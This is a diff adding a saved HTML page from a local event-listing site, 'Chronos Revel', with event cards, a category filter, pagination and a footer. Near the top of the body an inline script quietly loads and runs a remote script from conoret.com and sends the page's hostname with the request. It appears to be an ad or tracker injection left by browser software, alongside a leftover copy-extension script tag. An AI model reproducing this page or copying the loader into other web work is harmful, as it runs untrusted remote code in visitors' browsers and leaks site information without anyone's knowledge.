@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<!-- saved from url=(0031)http://localhost:8000/index.php -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <!-- Define character set and ensure responsive scaling on different devices -->
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Page title shown in browser tab -->
+  <title>Events | Chronos Revel</title>
+
+  <!-- Link to the main stylesheet for page styling -->
+  <link rel="stylesheet" href="./Events _ Chronos Revel_files/vje.css">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Browse Events | Chronos Revel</title><link rel="stylesheet" href="./Events _ Chronos Revel_files/vje.css"><style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.enable_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.enable_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.enable_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.enable_copy_btns_btn:hover{opacity:.8}.enable_copy_btns_btn:active{opacity:1}</style></head>
+
+<!--
+  Include the PHP file responsible for querying and outputting
+  the list of events in HTML format. Keeping logic separate
+  from the template helps maintain cleaner code.
+  -->
+
+
+
+
+
+    
+    
+    
+    
+
+
+<body inmaintabuse="1" cz-shortcut-listen="true"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+    
+<!-- Link to global stylesheet for shared site styling -->
+<link rel="stylesheet" href="./Events _ Chronos Revel_files/vje.css">
+
+<!-- Sticky header wrapper: stays at top during scroll -->
+<div class="sticky_header">
+    <header>
+        <!-- Site logo/title, links back to home or branding -->
+        <div class="logo">Chronos Revel</div>
+
+        <!-- Central search box for event lookup -->
+        <div class="search_container">
+            <input class="search_input" type="text" placeholder="Search" id="global_search_input">
+        </div>
+
+        <!-- User actions: login link when not authenticated -->
+        <div class="user_actions">
+            <a href="http://localhost:8000/index.php#" class="profile_btn">Login</a>
+        </div>
+    </header>
+
+    <!-- Main site navigation -->
+    <nav>
+        <a href="http://localhost:8000/index.php">Home</a>
+        <a href="http://localhost:8000/event_listing.php?filter=past">History</a>
+        <a href="http://localhost:8000/event_listing.php?filter=upcoming">Upcoming</a>
+        <a href="http://localhost:8000/about_us.php">About Us</a>
+    </nav>
+</div>    <main>
+        <h2 class="section_title">Browse Events</h2>
+        <input type="hidden" id="filter_type" value="">
+        <div class="filter_bar" style="margin-bottom: 20px;">
+            <select id="event_filter">
+                <option value="">All Categories</option>
+                <option value="Music">Music</option>
+                <option value="Technology">Technology</option>
+                <option value="Culture">Culture</option>
+                <option value="Business">Business</option>
+                <option value="Festival">Festival</option>
+                <option value="Comedy">Comedy</option>
+                <option value="Sports">Sports</option>
+            </select>
+
+        </div>
+
+        <div id="event_grid" class="event_grid">
+            <div class="event_card">
+                
+                    <div class="event_image">
+                        <img src="./Events _ Chronos Revel_files/1748427428_venice_biennale.jpg" alt="Venice Biennale 2025">
+                    </div>
+                <div class="event_details">
+                    <h3 class="event_title">Venice Biennale 2025</h3>
+                    <p class="event_description">
+                        <span id="short-0">International art exhibition presenting contemporary installations and performances....</span>
+                        <span id="full-0" class="fade-toggle" style="display:none;">International art exhibition presenting contemporary installations and performances.</span>
+                    </p>
+                    <button class="toggle_description_btn" onclick="toggleDescription(0)">More</button>
+                    <div class="event_meta">
+                        <div class="event_location">Venice, Italy</div>
+                        <div class="event_date">2025-06-01</div>
+                    </div>
+                    <button class="register_button">Register</button>
+                </div>
+            </div>
+        
+            <div class="event_card">
+                
+                    <div class="event_image">
+                        <img src="./Events _ Chronos Revel_files/1748430295_ms_build.jpg" alt="Microsoft Build 2025">
+                    </div>
+                <div class="event_details">
+                    <h3 class="event_title">Microsoft Build 2025</h3>
+                    <p class="event_description">
+                        <span id="short-1">Keynotes and sessions on cloud, AI, and developer tools by Microsoft....</span>
+                        <span id="full-1" class="fade-toggle" style="display:none;">Keynotes and sessions on cloud, AI, and developer tools by Microsoft.</span>
+                    </p>
+                    <button class="toggle_description_btn" onclick="toggleDescription(1)">More</button>
+                    <div class="event_meta">
+                        <div class="event_location">Seattle, WA</div>
+                        <div class="event_date">2025-06-03</div>
+                    </div>
+                    <button class="register_button">Register</button>
+                </div>
+            </div>
+        
+            <div class="event_card">
+                
+                    <div class="event_image">
+                        <img src="./Events _ Chronos Revel_files/1748426393_edc_lv.jpg" alt="EDC Las Vegas 2025">
+                    </div>
+                <div class="event_details">
+                    <h3 class="event_title">EDC Las Vegas 2025</h3>
+                    <p class="event_description">
+                        <span id="short-2">Global electronic dance music festival at the Las Vegas Motor Speedway....</span>
+                        <span id="full-2" class="fade-toggle" style="display:none;">Global electronic dance music festival at the Las Vegas Motor Speedway.</span>
+                    </p>
+                    <button class="toggle_description_btn" onclick="toggleDescription(2)">More</button>
+                    <div class="event_meta">
+                        <div class="event_location">Las Vegas, NV</div>
+                        <div class="event_date">2025-06-20</div>
+                    </div>
+                    <button class="register_button">Register</button>
+                </div>
+            </div>
+        
+            <div class="event_card">
+                
+                    <div class="event_image">
+                        <img src="./Events _ Chronos Revel_files/glastonbury.jpg" alt="Glastonbury Festival 2025">
+                    </div>
+                <div class="event_details">
+                    <h3 class="event_title">Glastonbury Festival 2025</h3>
+                    <p class="event_description">
+                        <span id="short-3">Renowned British music and performing arts festival....</span>
+                        <span id="full-3" class="fade-toggle" style="display:none;">Renowned British music and performing arts festival.</span>
+                    </p>
+                    <button class="toggle_description_btn" onclick="toggleDescription(3)">More</button>
+                    <div class="event_meta">
+                        <div class="event_location">Pilton, UK</div>
+                        <div class="event_date">2025-06-25</div>
+                    </div>
+                    <button class="register_button">Register</button>
+                </div>
+            </div>
+        
+            <div class="event_card">
+                
+                    <div class="event_image">
+                        <img src="./Events _ Chronos Revel_files/comicstaan.jpg" alt="Comicstaan Live">
+                    </div>
+                <div class="event_details">
+                    <h3 class="event_title">Comicstaan Live</h3>
+                    <p class="event_description">
+                        <span id="short-4">Top Indian stand-up acts from Amazon Prime’s Comicstaan....</span>
+                        <span id="full-4" class="fade-toggle" style="display:none;">Top Indian stand-up acts from Amazon Prime’s Comicstaan.</span>
+                    </p>
+                    <button class="toggle_description_btn" onclick="toggleDescription(4)">More</button>
+                    <div class="event_meta">
+                        <div class="event_location">Bangalore</div>
+                        <div class="event_date">2025-06-30</div>
+                    </div>
+                    <button class="register_button">Register</button>
+                </div>
+            </div>
+        
+            <div class="event_card">
+                
+                    <div class="event_image">
+                        <img src="./Events _ Chronos Revel_files/1748429937_wimbledon.jpg" alt="Wimbledon Championships 2025">
+                    </div>
+                <div class="event_details">
+                    <h3 class="event_title">Wimbledon Championships 2025</h3>
+                    <p class="event_description">
+                        <span id="short-5">Grand Slam tennis tournament on grass courts....</span>
+                        <span id="full-5" class="fade-toggle" style="display:none;">Grand Slam tennis tournament on grass courts.</span>
+                    </p>
+                    <button class="toggle_description_btn" onclick="toggleDescription(5)">More</button>
+                    <div class="event_meta">
+                        <div class="event_location">London, UK</div>
+                        <div class="event_date">2025-07-07</div>
+                    </div>
+                    <button class="register_button">Register</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="pagination_controls" style="text-align: center; margin-top: 20px;"><button class="pagination_btn" onclick="changePage(1)" disabled="">
+                1
+            </button><button class="pagination_btn" onclick="changePage(2)">
+                2
+            </button><button class="pagination_btn" onclick="changePage(3)">
+                3
+            </button><button class="pagination_btn" onclick="changePage(4)">
+                4
+            </button></div>
+    </main>
+    <!-- Link to the shared stylesheet for consistent footer styling -->
+<link rel="stylesheet" href="./Events _ Chronos Revel_files/vje.css">
+
+<footer class="footer">
+    <div class="footer_section footer_contact">
+        <span class="footer_logo">Chronos Revel</span>
+        <p>Contact us at:</p>
+        <p>+1 9830 248 448</p>
+        <p>chronosrevel@gmail.com</p>
+    </div>
+
+    <div class="footer_section footer_links">
+        <h3>Quick Links</h3>
+        <ul>
+            <li><a href="http://localhost:8000/about.php">About Us</a></li>
+            <li><a href="http://localhost:8000/faq.php">FAQ</a></li>
+            <li><a href="http://localhost:8000/terms.php">Terms of Service</a></li>
+            <li><a href="http://localhost:8000/privacy.php">Privacy Policy</a></li>
+        </ul>
+    </div>
+
+    <div class="footer_section footer_about">
+        <h3>Our Mission</h3>
+        <p>Connecting you with vibrant community events—discover, join, and make memories!</p>
+    </div>
+
+    <div class="footer_section footer_social">
+        <h3>Follow Us</h3>
+        <div class="social_icon">
+            <a href="https://google.com/" target="_blank" aria-label="Google">
+                <img src="./Events _ Chronos Revel_files/google.svg" alt="Google Logo">
+            </a>
+        </div>
+        <div class="social_icon">
+            <a href="https://facebook.com/" target="_blank" aria-label="Facebook">
+                <img src="./Events _ Chronos Revel_files/facebook.svg" alt="Facebook Logo">
+            </a>
+        </div>
+        <div class="social_icon">
+            <a href="https://twitter.com/" target="_blank" aria-label="Twitter">
+                <img src="./Events _ Chronos Revel_files/twitter.svg" alt="Twitter Logo">
+            </a>
+        </div>
+    </div>
+</footer>    <script src="./Events _ Chronos Revel_files/event_search.js.download"></script>
+
+
+
+
+
+<script src="./Events _ Chronos Revel_files/event_search.js.download"></script>
+
+
+
+
+<script src="chrome-extension://onepmapfbjohnegdmfhndpefjkppbjkm/sm.bundle.js" data-pname="supercopy-v3" data-asset-path="https://spc4.s3.ap-east-1.amazonaws.com"></script></body></html>
